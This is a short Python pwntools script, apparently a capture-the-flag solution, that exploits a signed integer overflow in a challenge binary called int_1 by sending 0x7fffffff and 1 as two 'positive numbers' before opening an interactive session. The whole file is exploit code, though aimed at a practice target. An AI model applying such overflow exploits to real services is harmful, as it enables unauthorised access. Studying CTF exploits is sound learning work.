#!/usr/bin/env python3
from pwn import *
import binascii

context.terminal = ["tmux", "splitw", "-h"] 

exe_path = './int_1'
HOST = 'ip/domain'
PORT = 1337

exe = ELF(exe_path, checksec=False)
context.binary = exe

gdbscript = '''
break *main
continue
'''

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    if args.GDB:
        return gdb.debug(exe.path, gdbscript=gdbscript)
    return process(exe.path)

p = start()

payload = 0x7fffffff

p.sendlineafter(b"Enter the first positive number: ", str(payload).encode())

payload = 1

p.sendlineafter(b"Enter the second positive number: ", str(payload).encode())

p.interactive() 
